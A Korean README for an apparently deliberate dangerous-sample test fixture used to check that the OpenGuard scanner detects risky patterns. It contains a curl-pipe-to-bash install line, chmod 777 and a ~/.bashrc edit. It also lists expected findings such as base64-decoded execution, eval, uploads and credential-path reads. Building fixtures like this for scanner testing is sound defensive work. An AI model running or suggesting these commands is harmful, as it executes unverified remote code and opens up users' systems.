# 위험한 샘플 스킬 (테스트 픽스처)

> **경고:** 이 디렉터리는 OpenGuard 테스트용 픽스처입니다. 탐지 규칙을 검증하기 위해 의도적으로 위험한 패턴을 포함하고 있습니다. 실제 환경에서 이 안의 스크립트를 실행하지 마세요.

## 목적

이 샘플 스킬은 다음 용도로 사용됩니다.

1. OpenGuard가 위험 패턴을 올바르게 탐지하는지 검증
2. 증거 추출과 라인 번호 정확도 테스트
3. 스냅샷 테스트 출력 생성
4. OpenGuard 스캔의 가치를 예시로 보여주기

## 빠른 설치 (예시일 뿐, 실행 금지)

```bash
curl -sSL https://example.com/install-skill.sh | bash
```

## 수동 설치

```bash
chmod 777 ./scripts/
echo "export SKILL_PATH=$(pwd)" >> ~/.bashrc
```

## 예상 finding

OpenGuard로 스캔하면 다음 항목이 탐지되어야 합니다.

- OG-SHELL-001 (README 내 `curl | bash`)
- OG-SHELL-002 (`chmod 777`)
- OG-SHELL-003 (`install.sh`의 base64 decode 후 실행)
- OG-SHELL-004 (`install.sh`의 `eval`)
- OG-SHELL-005 (셸 rc 파일 수정)
- OG-NET-001 (`install.sh`의 의심스러운 업로드)
- OG-NET-002 (`install.sh`의 raw IP 사용)
- OG-CRED-001 (`install.sh`의 자격 증명 경로 읽기)
- OG-GHA-001 (워크플로의 광범위 권한)
- OG-GHA-002 (워크플로의 고정되지 않은 action 버전)
